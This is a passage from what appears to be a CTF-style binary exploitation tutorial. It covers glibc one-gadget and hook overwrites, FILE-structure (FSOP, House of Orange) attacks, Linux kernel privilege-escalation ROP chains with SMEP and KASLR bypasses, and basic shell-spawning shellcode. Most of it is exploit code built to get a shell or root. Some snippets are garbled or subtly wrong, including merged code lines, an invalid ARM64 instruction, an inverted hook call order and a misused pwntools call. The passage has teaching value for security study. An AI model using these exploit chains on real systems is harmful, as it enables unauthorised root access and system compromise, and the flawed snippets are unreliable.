    p = start_exploit()
    
    # Overwrite with current gadget
    overwrite_target(gadget)
    
    try:
        # Trigger and check for shell
        trigger()
        p.sendline(b'echo pwned')
        if b'pwned' in p.recv():
            log.success(f"One-gadget {i} worked!")
            p.interactive()
            break
    except:
        p.close()
```

**Technique 3: Adjust call site**

```python
# If constraint: rsp+0x30 == NULL
# Call one-gadget from different location with different stack state

# Instead of overwriting __malloc_hook:
# Overwrite __free_hook (different stack at call)
# Or __realloc_hook (different stack)

free_hook = libc.symbols['__free_hook']
overwrite(free_hook, one_gadget)
free(chunk)  # Different constraints than malloc
```

### One-Gadget with __free_hook

**Advantages:**

- Different stack state than __malloc_hook
- Often satisfies different constraints
- Triggered via free() call

```python
# Find one-gadget that works with free() call site
libc = ELF('./libc.so.6')
one_gadget = libc.address + 0x4f432

# Overwrite __free_hook
free_hook = libc.symbols['__free_hook']

# Use tcache poisoning or other technique
tcache_poison(free_hook)
chunk = malloc(0x60)
write(chunk, p64(one_gadget))

# Trigger via free
victim = malloc(0x20)
free(victim)  # Calls __free_hook → one-gadget → shell
```

### One-Gadget with __realloc_hook

**Combined technique:** Use both __realloc_hook and __malloc_hook

**Why useful:** Adjust stack before one-gadget

```python
# __realloc_hook called first during realloc()
# Can use to adjust stack, then call __malloc_hook

realloc_hook = libc.symbols['__realloc_hook']
malloc_hook = libc.symbols['__malloc_hook']

# Set __realloc_hook to stack adjustment gadget
# Example: multiple push/pop to align stack
stack_adj = libc.address + 0x123456  # pop multiple regs gadget

overwrite(realloc_hook, stack_adj)
overwrite(malloc_hook, one_gadget)

# Trigger malloc → calls __malloc_hook → calls __realloc_hook → one-gadget
malloc(1)
```

### One-Gadget Alternatives

**When one-gadgets don't work:**

**Option 1: Magic gadget (setcontext-based)**

```python
# Modern libc has setcontext+53 gadget
# Loads registers from RDX pointer
# Allows full register control

# Find with:
# ROPgadget --binary libc.so.6 | grep setcontext

setcontext_53 = libc.symbols['setcontext'] + 53

# Build fake setcontext frame
frame = SigreturnFrame()
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rsp = controlled_stack
frame.rip = system

# RDX must point to frame
# Overwrite hook with setcontext+53
# Ensure RDX points to frame when triggered
```

**Option 2: Custom ROP chain**

```python
# If hooks don't work with one-gadget
# Use hook to pivot to controlled region
# Execute ROP chain there

malloc_hook = libc.symbols['__malloc_hook']

# Hook points to stack pivot
stack_pivot = libc.address + 0xabc123  # leave; ret or similar

overwrite(malloc_hook, stack_pivot)

# Prepare ROP chain in controlled memory
rop_chain = p64(pop_rdi) + p64(bin_sh)
rop_chain += p64(system)
write_to_memory(rop_location, rop_chain)

# Trigger: pivots to rop_chain → system("/bin/sh")
malloc(1)
```

### One-Gadget Debugging

**Finding why one-gadget fails:**

```gdb
# Break before hook call
b malloc

# Continue to hook trigger
continue

# Step into hook
si

# Should hit one-gadget
# Check constraints
x/20gx $rsp        # Check stack values
print $rax         # Check registers
print $rdi

# If crashes, examine failure
bt                 # Backtrace
info registers     # All registers

# Try different one-gadget
set $rip = <different_one_gadget>
continue
```

**Common failure reasons:**

1. Constraint not satisfied (check with GDB)
2. Stack misalignment (add ret gadget before one-gadget)
3. Wrong libc version (one-gadget offsets differ)
4. Hook call site has incompatible stack state

---

## File Structure Exploitation (_IO_FILE)

### _IO_FILE Structure Overview

**FILE streams:** C standard library I/O abstraction

**_IO_FILE structure:** Internal implementation of FILE*

**Location:** Defined in libio.h (glibc)

**Common usage:**

```c
FILE *fp = fopen("file.txt", "r");  // Allocates _IO_FILE
fread(buffer, 1, 100, fp);          // Uses _IO_FILE operations
fclose(fp);                         // Frees _IO_FILE
```

### _IO_FILE Structure Layout (x64)

```c
struct _IO_FILE {
    int _flags;              // 0x00: Flags (mode, EOF, error)
    char *_IO_read_ptr;      // 0x08: Current read pointer
    char *_IO_read_end;      // 0x10: End of get area
    char *_IO_read_base;     // 0x18: Start of get area
    char *_IO_write_base;    // 0x20: Start of put area
    char *_IO_write_ptr;     // 0x28: Current put pointer
    char *_IO_write_end;     // 0x30: End of put area
    char *_IO_buf_base;      // 0x38: Start of reserve area
    char *_IO_buf_end;       // 0x40: End of reserve area
    char *_IO_save_base;     // 0x48: Save area
    char *_IO_backup_base;   // 0x50: Backup area
    char *_IO_save_end;      // 0x58: End of save area
    struct _IO_marker *_markers;  // 0x60
    struct _IO_FILE *_chain;      // 0x68: Next FILE in list
    int _fileno;             // 0x70: File descriptor
    int _flags2;             // 0x74: Additional flags
    __off_t _old_offset;     // 0x78: Old offset (for seeking)
    unsigned short _cur_column;   // 0x80
    signed char _vtable_offset;   // 0x82
    char _shortbuf[1];       // 0x83: Emergency buffer
    _IO_lock_t *_lock;       // 0x88: Lock pointer
    __off64_t _offset;       // 0x90
    void *_codecvt;          // 0x98
    void *_wide_data;        // 0xa0
    struct _IO_FILE *_freeres_list;  // 0xa8
    void *_freeres_buf;      // 0xb0
    size_t __pad5;           // 0xb8
    int _mode;               // 0xc0
    char _unused2[20];       // 0xc4: Padding
    // Total size: 0xd8 (216 bytes)
};

// Followed by vtable pointer
struct _IO_FILE_plus {
    _IO_FILE file;
    const struct _IO_jump_t *vtable;  // 0xd8: Virtual function table
};
```

### _IO_FILE Virtual Table (_IO_jump_t)

**Vtable structure:**

```c
struct _IO_jump_t {
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);      // Destructor
    JUMP_FIELD(_IO_overflow_t, __overflow);  // Called when buffer full
    JUMP_FIELD(_IO_underflow_t, __underflow);// Called when buffer empty
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    JUMP_FIELD(_IO_xsputn_t, __xsputn);      // Write multiple bytes
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);      // Read multiple bytes
    JUMP_FIELD(_IO_seekoff_t, __seekoff);    // Seek operation
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);          // Sync/flush
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);        // Close file
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
```

**Vtable function calls:**

```c
// Example: fclose(fp) eventually calls
fp->vtable->__finish(fp);
fp->vtable->__close(fp);

// fwrite calls
fp->vtable->__xsputn(fp, buffer, size);

// fread calls
fp->vtable->__xsgetn(fp, buffer, size);
```

### FSOP (File Stream Oriented Programming)

**Concept:** Abuse _IO_FILE structures to gain code execution

**Attack vectors:**

1. Overwrite existing FILE structure
2. Create fake FILE structure
3. Corrupt _IO_list_all (global linked list of FILE streams)
4. Trigger vtable function call

**Common triggers:**

- `fclose()` → calls `__finish` and `__close`
- `exit()` / `abort()` → flushes all streams via `_IO_flush_all_lockp`
- Exception handling → may flush streams
- Program termination → cleanup calls vtable functions

### Basic FSOP Attack: Vtable Hijacking

**Goal:** Overwrite vtable pointer to fake vtable

**Pre-glibc 2.24 (no vtable validation):**

```python
# Step 1: Create fake vtable
fake_vtable = p64(0) * 2          # __dummy, __dummy2
fake_vtable += p64(system_addr)   # __finish → system
fake_vtable += p64(0) * 15        # Other function pointers

# Step 2: Create fake FILE structure
fake_file = p64(0)                # _flags (or craft specific flags)
fake_file += p64(0) * 12          # Other fields (mostly ignored)
fake_file += p64(bin_sh_addr)     # _chain (will be used as arg sometimes)
fake_file += p64(0) * 20          # More fields
fake_file += p64(fake_vtable_addr)  # Vtable pointer

# Step 3: Overwrite existing FILE or _IO_list_all
overwrite(target_file_ptr, fake_file)

# Step 4: Trigger vtable call
# exit() calls _IO_flush_all_lockp → calls vtable functions
exit()  # Or trigger crash, exception, etc.
```

### Vtable Validation (glibc ≥ 2.24)

**Protection:** Vtable pointer must point to valid vtable region

**Check implementation:**

```c
// Simplified vtable validation
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
    uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
    uintptr_t ptr = (uintptr_t) vtable;
    uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables;
    
    if (offset < section_length)
        return vtable;  // Valid vtable
    else
        _IO_vtable_check();  // Abort
}
```

**Bypass strategies:**

**1. Use legitimate vtable with controlled FILE structure:**

```python
# Don't overwrite vtable pointer
# Instead, craft FILE structure to control execution flow

# Example: __overflow vtable function uses FILE fields
fake_file = p64(0xfbad1800)      # _flags: enable write mode
fake_file += p64(0) * 6           # read pointers (unused)
fake_file += p64(target_addr) # _IO_write_base (used by __overflow) fake_file += p64(target_addr + 1) # _IO_write_ptr (must be > write_base) fake_file += p64(0) * 16 fake_file += p64(legitimate_vtable) # Use real vtable

# When __overflow called, may write to target_addr
````

**2. House of Orange (no malloc/free):**
```python
# Corrupt top chunk → trigger sysmalloc → malloc_printerr → abort
# abort() flushes all FILE streams via _IO_flush_all_lockp
# Corrupt _IO_list_all to point to fake FILE with legitimate vtable
# Craft FILE to control execution during flush
````

**3. _IO_str_jumps exploitation:**

```c
// _IO_str_jumps is legitimate vtable for string streams
// __finish function in _IO_str_jumps:
_IO_str_finish (_IO_FILE *fp, int dummy)
{
    if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
        ((void (*)(void *)) fp->_IO_buf_base) (fp->_IO_buf_end);
        // Calls fp->_IO_buf_base as function pointer!
    
    fp->_IO_buf_base = NULL;
}
```

**Exploitation:**

```python
# Use _IO_str_jumps vtable (legitimate, passes validation)
io_str_jumps = libc.symbols['_IO_str_jumps']

# Craft FILE structure
fake_file = p64(0)                # _flags (no _IO_USER_BUF flag)
fake_file += p64(0) * 7
fake_file += p64(system_addr)     # _IO_buf_base (called as function)
fake_file += p64(bin_sh_addr)     # _IO_buf_end (first argument)
fake_file += p64(0) * 18
fake_file += p64(io_str_jumps)    # Legitimate vtable

# Trigger: fclose() → __finish → calls system("/bin/sh")
```

### House of Orange Technique

**Scenario:** No malloc/free primitives, only overflow

**Goal:** Trigger unsorted bin attack + FSOP

**Steps:**

**Step 1: Corrupt top chunk size**

```python
# Overflow into top chunk metadata
payload = b'A' * offset
payload += p64(0)              # prev_size (unused)
payload += p64(0xf21)          # Corrupted size (must pass checks)
# Size must be:
# - Aligned
# - Less than system memory limit
# - Greater than current top chunk size + request

p.send(payload)
```

**Step 2: Trigger top chunk extension (sysmalloc)**

```python
# Request large allocation
# Top chunk too small → sysmalloc() called
# Old top chunk moved to unsorted bin
large_alloc = malloc(0x1000)
```

**Step 3: Unsorted bin attack on _IO_list_all**

```python
# Old top chunk now in unsorted bin with fd/bk pointers
# Corrupt bk pointer to target _IO_list_all - 0x10

# Overflow or UAF to corrupt unsorted bin chunk
# (See Unsorted Bin Attacks section)
unsorted_chunk_bk = io_list_all - 0x10

# Next allocation triggers unsorted bin attack
# _IO_list_all now points to main_arena region
small_alloc = malloc(0x60)
```

**Step 4: Craft fake FILE in unsorted bin**

```python
# _IO_list_all now points to location we control
# Create fake FILE structure there

# Requirements for _IO_flush_all_lockp:
# 1. _mode > 0 (for wide character check)
# 2. _IO_write_ptr > _IO_write_base (has data to flush)
# 3. Valid vtable

fake_file = b'/bin/sh\x00'       # _flags (also "/bin/sh" string)
fake_file += p64(0x61)           # _IO_read_ptr (fake size field)
fake_file += p64(0)              # _IO_read_end
fake_file += p64(io_list_all)    # _IO_read_base
fake_file += p64(0)              # _IO_write_base
fake_file += p64(1)              # _IO_write_ptr (> write_base)
fake_file += p64(0) * 10
fake_file += p64(next_file)      # _chain (NULL to end list)
fake_file += p64(0) * 2
fake_file += p64(0)              # _mode = 0 initially
fake_file += p64(0) * 5
fake_file += p64(io_str_jumps)   # Legitimate vtable

# Overwrite in unsorted bin region
write_to_unsorted_bin(fake_file)
```

**Step 5: Trigger abort/exit**

```python
# Cause program to abort (invalid free, assertion, etc.)
# abort() → _IO_flush_all_lockp → iterates _IO_list_all
# Calls vtable functions on our fake FILE
free(invalid_ptr)  # Or other crash trigger
```

**Complete House of Orange:**

```python
from pwn import *

# Step 1: Overflow top chunk
payload = b'A' * offset
payload += p64(0) + p64(0xf21)
overflow(payload)

# Step 2: Trigger sysmalloc
malloc(0x1000)

# Step 3: Unsorted bin attack
io_list_all = libc.symbols['_IO_list_all']
unsorted_bin_attack(io_list_all)

# Step 4: Craft fake FILE
fake_file = craft_fake_file(io_str_jumps, system, bin_sh)
write_to_arena(fake_file)

# Step 5: Trigger
trigger_abort()
p.interactive()
```

### _IO_FILE Arbitrary Read

**Technique:** Use FILE structure to read arbitrary memory

**Exploitation via fread:**

```python
# Control FILE structure used by fread
# Set read pointers to target memory region

fake_file = p64(0xfbad2488)      # _flags: _IO_MAGIC | _IO_IS_FILEBUF | _IO_NO_WRITES
fake_file += p64(target_addr)    # _IO_read_ptr (current position)
fake_file += p64(target_addr)    # _IO_read_end (end of buffer)
fake_file += p64(target_addr)    # _IO_read_base (start of buffer)
fake_file += p64(target_addr)    # _IO_write_base
fake_file += p64(target_addr+size)  # _IO_write_ptr
fake_file += p64(target_addr+size)  # _IO_write_end
fake_file += p64(target_addr)    # _IO_buf_base (buffer start)
fake_file += p64(target_addr+size)  # _IO_buf_end (buffer end)

# Trigger fread on fake FILE
# Will read from target_addr
```

### _IO_FILE Arbitrary Write

**Technique:** Use FILE structure to write arbitrary memory

**Exploitation via fwrite/fflush:**

```python
# Control FILE structure to write to arbitrary location

fake_file = p64(0xfbad1800)      # _flags: write mode
fake_file += p64(0) * 6           # Read pointers (unused)
fake_file += p64(target_addr)    # _IO_write_base (write start)
fake_file += p64(target_addr)    # _IO_write_ptr (current position)
fake_file += p64(target_addr+size)  # _IO_write_end
fake_file += p64(target_addr)    # _IO_buf_base
fake_file += p64(target_addr+size)  # _IO_buf_end
# ... set fileno, vtable, etc.

# Trigger fwrite/fflush
# Will write buffer contents to target_addr
```

### Modern FSOP Techniques

**_IO_wfile_overflow (wide character):**

```python
# Wide character FILE structures have additional exploitation vectors
# _IO_wfile_jumps vtable has useful functions

# Key function: _IO_wfile_overflow
# Uses _wide_data pointer from FILE structure

fake_wide_data = p64(0) * 4
fake_wide_data += p64(target_addr)    # _IO_write_base
fake_wide_data += p64(target_addr+1)  # _IO_write_ptr

fake_file = p64(0) * 18
fake_file += p64(fake_wide_data_addr) # _wide_data
fake_file += p64(0) * 5
fake_file += p64(io_wfile_jumps)      # _IO_wfile_jumps vtable

# Trigger wide char operation
```

**Largebin attack + FSOP:**

```python
# Combine largebin attack with FSOP
# Largebin attack writes large value to arbitrary location
# Use to corrupt _IO_list_all or FILE structures

# 1. Largebin attack to corrupt _IO_list_all
# 2. Craft fake FILE in controlled memory
# 3. Trigger via exit/abort
```

### FSOP Debugging

**Inspecting FILE structures in GDB:**

```gdb
# View stdin/stdout/stderr
p *stdin
p *(struct _IO_FILE_plus *)stdin

# View all FILE streams
x/gx &_IO_list_all
# Follow _chain pointers

# Examine vtable
p ((struct _IO_FILE_plus *)stdin)->vtable
x/20gx ((struct _IO_FILE_plus *)stdin)->vtable

# During exploit, check fake FILE
x/50gx <fake_file_addr>

# Break on vtable functions
b _IO_file_overflow
b _IO_str_finish
b _IO_flush_all_lockp

# Trace FILE operations
catch syscall write
catch syscall read
```

**Common issues:**

1. Invalid vtable (fails validation) → Use legitimate vtable
2. Incorrect flags → Craft flags carefully (_IO_IS_FILEBUF, etc.)
3. NULL pointer dereference → Ensure required fields set
4. Alignment issues → Align structures properly

---

## Kernel Exploitation Basics

### Kernel vs Userspace

**Key differences:**

|Aspect|Userspace|Kernel|
|---|---|---|
|Privilege|Ring 3 (user mode)|Ring 0 (kernel mode)|
|Memory access|Virtual, restricted|Physical, full access|
|Crash impact|Process terminates|System panic (reboot)|
|Protections|ASLR, NX, Stack canary|KASLR, SMEP, SMAP, KPTI|
|Debugging|GDB, tools readily available|Requires special setup|

**Kernel exploitation goals:**

1. Escalate privileges (uid 0)
2. Disable security mechanisms (SELinux, AppArmor)
3. Gain arbitrary read/write primitives
4. Execute code in kernel context

### Kernel Attack Surface

**Common vulnerability sources:**

**1. System calls:**

- Direct interface to kernel
- Parse user input
- Copy data between user/kernel space

**2. Device drivers (ioctl):**

- Character devices (/dev/*)
- Often third-party or poorly audited
- Complex state machines

**3. Kernel modules:**

- Loadable kernel code
- May have vulnerabilities
- Often less scrutinized than core kernel

**4. Proc/sysfs interfaces:**

- /proc and /sys file operations
- Read/write operations to kernel structures

**5. Network stack:**

- Packet parsing
- Protocol implementations
- Complex, large attack surface

### Kernel Exploitation Environment Setup

**QEMU setup for kernel debugging:**

```bash
# Install QEMU
sudo apt install qemu-system-x86

# Create minimal root filesystem
mkdir rootfs
cd rootfs
mkdir -p {bin,sbin,etc,proc,sys,dev,home}

# Copy busybox (static)
cp /path/to/busybox bin/
ln -s busybox bin/sh

# Create init script
cat > init << 'EOF'
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
exec /bin/sh
EOF
chmod +x init

# Create initramfs
find . | cpio -o -H newc | gzip > ../initramfs.cpio.gz

# Boot kernel with QEMU
qemu-system-x86_64 \
    -kernel bzImage \
    -initrd initramfs.cpio.gz \
    -append "console=ttyS0 nokaslr" \
    -nographic \
    -s \
    -S  # Pauses at start for debugging
```

**GDB kernel debugging:**

```bash
# In one terminal: Start QEMU with -s -S
qemu-system-x86_64 -kernel bzImage -initrd initramfs.cpio.gz -s -S

# In another terminal: Connect GDB
gdb vmlinux  # Kernel image with symbols
(gdb) target remote :1234
(gdb) continue
```

**Useful kernel debugging:**

```gdb
# Set breakpoints on kernel functions
b sys_read
b vulnerable_ioctl

# Examine kernel structures
p current                    # Current task_struct
p current->cred              # Current credentials
x/20gx current->cred

# Kernel memory
x/20gx 0xffffffff81000000   # Kernel text

# Symbol lookup
info address sys_open
p &commit_creds
```

### Kernel Protection Mechanisms

**KASLR (Kernel Address Space Layout Randomization):**

```bash
# Check if KASLR enabled
cat /proc/cmdline | grep nokaslr
# If "nokaslr" present → KASLR disabled

# Boot without KASLR (testing)
# Add "nokaslr" to kernel command line
```

**SMEP (Supervisor Mode Execution Prevention):**

- Prevents kernel from executing userspace code
- CPU feature (CR4 register bit 20)
- Bypass: ROP entirely in kernel, or disable CR4.SMEP

**SMAP (Supervisor Mode Access Prevention):**

- Prevents kernel from accessing userspace memory
- CR4 register bit 21
- Bypass: Use copy_from_user/copy_to_user, or disable CR4.SMAP

**KPTI (Kernel Page Table Isolation):**

- Separate page tables for kernel and userspace
- Mitigates Meltdown
- Makes exploitation harder (separate address spaces)

**Stack canaries (kernel):**

- Similar to userspace
- Stored in task_struct
- Check on function return

### Typical Kernel Vulnerability: Stack Overflow

**Vulnerable kernel module example:**

```c
// vuln.c - Vulnerable kernel module
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/device.h>

static ssize_t vuln_write(struct file *file, const char __user *buf,
                          size_t count, loff_t *ppos)
{
    char kbuf[64];  // Stack buffer
    
    // Vulnerable: No bounds check
    copy_from_user(kbuf, buf, count);  // Copies 'count' bytes
    
    printk(KERN_INFO "Received: %s\n", kbuf);
    return count;
}

static struct file_operations fops = {
    .write = vuln_write,
};

static int __init vuln_init(void) {
    // Register char device
    register_chrdev(240, "vuln", &fops);
    return 0;
}

module_init(vuln_init);
```

**Exploitation approach:**

1. Trigger overflow via write() to /dev/vuln
2. Overwrite return address on kernel stack
3. ROP chain to escalate privileges
4. Return to userspace with root privileges

### Kernel Privilege Escalation Primitives

**commit_creds(prepare_kernel_cred(0)):**

```c
// Kernel functions for privilege escalation
struct cred *prepare_kernel_cred(struct task_struct *daemon);
int commit_creds(struct cred *new);

// Typical usage:
commit_creds(prepare_kernel_cred(0));
// Sets current process credentials to root (uid 0)
```

**Exploitation code (userspace):**

```c
// Shellcode to call commit_creds(prepare_kernel_cred(0))
void get_root(void) {
    commit_creds(prepare_kernel_cred(0));
}

// In exploit:
unsigned long commit_creds_addr = 0xffffffff810a1420;  // Leaked
unsigned long prepare_kernel_cred_addr = 0xffffffff810a1810;

// Build ROP chain or call directly if SMEP disabled
```

### Kernel ROP Chain Construction

**Typical kernel ROP chain:**

```
Goal: commit_creds(prepare_kernel_cred(0))

Chain:
1. pop rdi; ret               → Set RDI = 0
2. prepare_kernel_cred addr   → Call prepare_kernel_cred(0)
3. mov rdi, rax; ret          → Move result to RDI
4. commit_creds addr          → Call commit_creds(rax)
5. swapgs; ret                → Switch GS (userspace/kernel)
6. iretq gadget               → Return to userspace
7. User CS/SS/RFLAGS/RSP/RIP  → Restore userspace context
```

**Building the chain:**

```c
unsigned long *rop = (unsigned long *)(overflow_buf + offset);

*rop++ = pop_rdi_ret;
*rop++ = 0;                              // Argument: NULL
*rop++ = prepare_kernel_cred_addr;
*rop++ = mov_rdi_rax_ret;                // Move cred to RDI
*rop++ = commit_creds_addr;

// Return to userspace
*rop++ = swapgs_pop_rbp_ret;
*rop++ = 0;                              // Dummy RBP
*rop++ = iretq_ret;

// IRETQ frame
*rop++ = (unsigned long)shell_function;  // RIP
*rop++ = user_cs;                        // CS
*rop++ = user_rflags;                    // RFLAGS
*rop++ = user_sp;                        // RSP
*rop++ = user_ss;                        // SS
```

**Saving userspace state:**

```c
unsigned long user_cs, user_ss, user_sp, user_rflags;

void save_state(void) {
    __asm__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags)
        :
        : "memory"
    );
}
```

### Kernel Address Leaks

**Leaking kernel addresses:**

**1. /proc/kallsyms (if not restricted):**

```c
// Read kernel symbol addresses
FILE *fp = fopen("/proc/kallsyms", "r");
char line[256];
while (fgets(line, sizeof(line), fp)) {
    unsigned long addr;
    char type, name[128];
    sscanf(line, "%lx %c %s", &addr, &type, name);
    
    if (strcmp(name, "commit_creds") == 0)
        commit_creds_addr = addr;
    if (strcmp(name, "prepare_kernel_cred") == 0)
        prepare_kernel_cred_addr = addr;
}
```

**2. dmesg (kernel log) leaks:**

```bash
dmesg | grep "0xffffffff"
# May contain kernel addresses in error messages
```

**3. Kernel module leak via ioctl:**

```c
// If module provides ioctl to leak addresses
ioctl(fd, LEAK_CMD, &leak_buf);
kernel_base = leaked_addr - offset;
```

**4. Timing side-channels:**

```c
// Speculative execution attacks (Spectre, Meltdown)
// Beyond scope, but can leak kernel memory
```

### ret2usr Attack (No SMEP)

**Technique:** Return to userspace function from kernel

**Requirements:**

- SMEP disabled (or bypassed)
- Can control kernel RIP

**Exploitation:**

```c
// Userspace function to escalate privileges
void get_shell(void) {
    commit_creds(prepare_kernel_cred(0));
    system("/bin/sh");
}

// In exploit:
unsigned long *rop = (unsigned long *)(overflow_buf + offset);
*rop++ = (unsigned long)get_shell;  // Return to userspace function
```

**Simpler than ROP:** Just one address to overwrite

### Bypassing SMEP

**Technique 1: ROP to disable CR4.SMEP**

```c
// CR4 register controls SMEP (bit 20)
// Clear bit 20 to disable SMEP

// ROP chain:
*rop++ = pop_rdi_ret;
*rop++ = cr4_value_without_smep;  // CR4 with bit 20 cleared
*rop++ = mov_cr4_rdi_ret;          // Write to CR4
*rop++ = (unsigned long)get_shell; // Now can execute userspace
```

**Technique 2: Kernel ROP only**

```c
// Execute privilege escalation entirely in kernel
// commit_creds(prepare_kernel_cred(0))
// Then return to userspace normally
```

### Bypassing KASLR

**Technique 1: Kernel pointer leak**

```c
// If vulnerability provides arbitrary read
unsigned long leak = arbitrary_read(kernel_pointer_location);
kernel_base = leak - known_offset;
```

**Technique 2: Brute force**

```c
// Kernel entropy limited (depends on system)
// Can brute force if remote service restarts kernel
// Or if local and can retry crashes
```

**Technique 3: Physmap spray**

```c
// Physmap region maps all physical memory
// Less randomized than kernel text
// Can find kernel structures via physmap
```

[Inference] Modern kernels have significant hardening; successful exploitation typically requires multiple vulnerabilities or sophisticated techniques like heap spraying, use-after-free, or race conditions.

### Kernel Heap Exploitation

**kmalloc slabs:**

- Similar to userspace heap (glibc malloc)
- Slab allocator with different caches per size
- Use-after-free, double-free vulnerabilities

**Technique: Spray and spray:**

```c
// Spray heap with controlled objects
for (int i = 0; i < 1000; i++) {
    ioctl(fd, ALLOC_CMD, &controlled_data);
}

// Trigger free
ioctl(fd, FREE_CMD, vuln_object);

// Reallocate with attacker data
ioctl(fd, ALLOC_CMD, &fake_object);

// Trigger use of freed object (now contains fake data)
ioctl(fd, USE_CMD, vuln_object);
```

### Returning to Userspace Safely

**IRETQ method (x64):**

```c
// IRETQ pops RIP, CS, RFLAGS, RSP, SS from stack
// Must build proper frame

unsigned long iretq_frame[] = {
    (unsigned long)shell_function,  // RIP
    user_cs,                         // CS
    user_rflags,                     // RFLAGS
    user_sp,                         // RSP
    user_ss                          // SS
};

// ROP chain ends with:
*rop++ = iretq_ret_gadget;
// Followed by iretq_frame data
```

**SYSRET method (alternative):**

```c
// SYSRET returns from syscall
// RCX = RIP, R11 = RFLAGS
*rop++ = pop_rcx_ret;
*rop++ = (unsigned long)shell_function;
*rop++ = pop_r11_ret;
*rop++ = user_rflags;
*rop++ = sysretq_gadget;
```

---

**Critical related topics:**

- **ret2dir** (Exploiting direct physical memory mapping)
- **Dirty COW** (Copy-on-write race condition exploitation)
- **userfaultfd** (User-space fault handling for race condition exploitation)
- **JOP/COP kernel exploitation** (Jump/Call-oriented programming in kernel context)
- **Kernel module development** (Building custom vulnerable modules for practice)

---

# Shellcoding

## Shellcode Basics and Structure

Shellcode is self-contained machine code executing arbitrary actions without external dependencies. Understanding shellcode structure enables crafting reliable payloads for diverse exploitation scenarios.

**Shellcode definition**

Machine code bytes executable directly in memory:

```
Raw bytes: \x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68
Assembly:  xor rax, rax
           push rax
           mov rbx, 0x68732f6e69622f
```

**Shellcode characteristics**

1. **Position-independent** - Works at any memory address
2. **Self-contained** - No external references
3. **No null bytes** - Terminates strings prematurely
4. **Compact** - Minimal size for injection constraints
5. **Functional** - Achieves exploitation goal

**Basic x86-64 shellcode structure**

```asm
; Entry point (no assumptions about initial state)
xor rax, rax           ; Clear rax

; Setup syscall arguments
mov rdi, target_value  ; RDI = 1st argument
mov rsi, target_value  ; RSI = 2nd argument
mov rdx, target_value  ; RDX = 3rd argument

; Invoke syscall
mov rax, syscall_num   ; RAX = syscall number
syscall                ; Invoke kernel
```

**Minimal exit shellcode**

```asm
xor rdi, rdi           ; RDI = 0 (exit code)
mov rax, 0x3c          ; RAX = 60 (exit syscall)
syscall
```

Binary: `\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05` (10 bytes)

**Minimal /bin/sh execution**

```asm
xor rax, rax           ; Clear rax
xor rdi, rdi           ; RDI = 0

; Push "/bin/sh" string onto stack
mov rbx, 0x68732f6e69622f  ; "/bin/sh" (little-endian)
push rbx
mov rdi, rsp           ; RDI points to "/bin/sh"

; execve syscall
mov rax, 0x3b          ; RAX = 59 (execve)
xor rsi, rsi           ; RSI = NULL
xor rdx, rdx           ; RDX = NULL
syscall
```

Binary size: ~30 bytes

**ARM shellcode structure**

ARM uses different calling conventions:

```asm
; ARM (32-bit)
eor r0, r0, r0         ; R0 = 0
mov r7, #4             ; R7 = 4 (exit syscall ARM)
swi 0                  ; Software interrupt (syscall)
```

ARM64:

```asm
; ARM64
xor x0, x0, x0         ; X0 = 0
mov x8, #93            ; X8 = 93 (exit syscall)
svc 0                  ; Supervisor call (syscall)
```

**Windows x86-64 shellcode**

Windows uses different syscall mechanism (API calls):

```asm
; Windows shellcode structure
push 0x00636d64        ; "cmd" (reversed for push)
mov rcx, rsp           ; RCX = pointer to "cmd"

; Call WinExec API
mov rax, [address_of_WinExec]
call rax
```

Requires API resolution at runtime.

**Position-independent code (PIC)**

Shellcode must work at any address:

```asm
; Bad (absolute addressing):
mov rax, 0x401234      ; Fails if loaded at different address

; Good (RIP-relative):
lea rax, [rel bin_sh]  ; Calculate offset from current position
```

**String embedding in shellcode**

Strings must be position-independent:

```asm
; Method 1: Push onto stack
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp           ; RDI points to string

; Method 2: RIP-relative addressing
lea rdi, [rel bin_sh]
...
bin_sh: db "/bin/sh", 0
```

**Shellcode generation with pwntools**

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# Generate /bin/sh shellcode
shellcode = asm(shellcraft.sh())
print(shellcode.hex())

# Generate specific syscall
shellcode = asm(shellcraft.exit(0))
print(shellcode.hex())

# Custom assembly
shellcode = asm("""
    xor rax, rax
    xor rdi, rdi
    mov rax, 0x3c
    syscall
""")
```

**Shellcode testing**

Standalone execution:

```python
from pwn import *

shellcode = asm(shellcraft.sh())

# Execute shellcode
p = process(shellcode)
p.interactive()
```

Via GDB:

```bash
gdb -q
(gdb) file /dev/stdin <<< $(python3 -c "import sys; sys.stdout.buffer.write(shellcode)")
(gdb) break *0x0
(gdb) run
(gdb) stepi
```

**Shellcode debugging**

Disassemble binary shellcode:

```python
shellcode = asm(shellcraft.sh())

import capstone
md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
for insn in md.disasm(shellcode, 0):
    print(f"{insn.address:x}:\t{insn.mnemonic}\t{insn.op_str}")
```

**Size optimization**

Minimize shellcode size for injection constraints:

**Before (inefficient):**

```asm
mov rax, 0x0000000000000001
